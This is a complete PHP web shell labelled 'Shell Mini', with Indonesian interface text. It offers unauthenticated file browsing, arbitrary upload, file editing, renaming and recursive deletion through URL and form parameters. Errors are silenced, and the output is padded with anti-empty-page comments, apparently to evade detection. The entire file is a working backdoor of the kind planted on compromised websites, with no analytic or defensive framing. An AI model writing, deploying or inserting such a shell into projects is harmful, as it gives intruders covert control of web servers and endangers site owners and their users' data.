<?php
error_reporting(0);
set_time_limit(0);

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($path);
$scan = scandir($path);

echo "<h3>Shell Mini | Path: $path</h3>";

// Tombol Back / Up
$parent = dirname($path);
if ($parent != $path) {
    echo "<fieldset><legend>Navigasi</legend>
    <a href='?path=" . urlencode($parent) . "'>⬆️ Up</a>
    </fieldset><br>";
}

// Delete Handler
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
        echo "<fieldset><legend>Hapus File</legend>File '$target' dihapus.</fieldset><br>";
    } elseif (is_dir($target)) {
        function rrmdir($dir) {
            foreach (scandir($dir) as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = "$dir/$item";
                if (is_dir($path)) {
                    rrmdir($path);
                } else {
                    unlink($path);
                }
            }
            return rmdir($dir);
        }
        rrmdir($target);
        echo "<fieldset><legend>Hapus Folder</legend>Folder '$target' dihapus.</fieldset><br>";
    }
}

// Upload File
echo "<fieldset><legend>Upload File</legend>
<form method='POST' enctype='multipart/form-data'>
    Upload File: <input type='file' name='up'>
    <input type='submit' value='Upload'>
</form>";
if (isset($_FILES['up'])) {
    $u = $_FILES['up']['name'];
    if (@copy($_FILES['up']['tmp_name'], $u)) {
        echo "Upload sukses: $u<br>";
    } else {
        echo "Upload gagal.<br>";
    }
}
echo "</fieldset><br>";

// Buat Folder
echo "<fieldset><legend>Buat Folder</legend>
<form method='POST'>
    Buat Folder: <input type='text' name='folder'>
    <button name='mkfolder'>Buat</button>
</form>";
if (isset($_POST['mkfolder'])) {
    mkdir($_POST['folder']);
}
echo "</fieldset><br>";

// Buat File
echo "<fieldset><legend>Buat File</legend>
<form method='POST'>
    Buat File: <input type='text' name='newfile'>
    <button name='mkfile'>Buat</button>
</form>";
if (isset($_POST['mkfile'])) {
    file_put_contents($_POST['newfile'], '');
}
echo "</fieldset><br>";

// Rename
echo "<fieldset><legend>Rename</legend>
<form method='POST'>
    Rename: <input type='text' name='old'> → <input type='text' name='new'>
    <button name='rename'>Ganti Nama</button>
</form>";
if (isset($_POST['rename'])) {
    rename($_POST['old'], $_POST['new']);
}
echo "</fieldset><br>";

// Edit File
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    echo "<fieldset><legend>Edit File: $f</legend>
    <form method='POST'>
        <textarea name='text' rows='20' cols='80'>".htmlspecialchars(file_get_contents($f))."</textarea><br>
        <input type='hidden' name='file' value='$f'>
        <button name='save'>Simpan</button>
    </form>
    </fieldset><br>";
}

if (isset($_POST['save'])) {
    file_put_contents($_POST['file'], $_POST['text']);
    echo "<fieldset><legend>Status</legend>Tersimpan.</fieldset><br>";
}

// Daftar Isi Folder
echo "<fieldset><legend>Isi Folder</legend>";
echo "<table border='1' cellpadding='5'>";
echo "<tr><th>Nama</th><th>Aksi</th></tr>";

foreach ($scan as $item) {
    if ($item == "." || $item == "..") continue;
    $realItem = realpath($item);
    echo "<tr>";
    if (is_dir($item)) {
        echo "<td>[DIR] <a href='?path=" . urlencode($realItem) . "'>$item</a></td><td>";
    } else {
        echo "<td>[FILE] $item</td><td>";
        echo "<a href='?path=" . urlencode($path) . "&edit=$item'>[Edit]</a> ";
    }
    echo "<a href='?path=" . urlencode($path) . "&delete=" . urlencode($item) . "' onclick=\"return confirm('Yakin ingin hapus $item?')\">[Delete]</a>";
    echo "</td></tr>";
}
echo "</table></fieldset><br>";

echo str_repeat("<!--ANTI-0KB-->", 1000);
?>
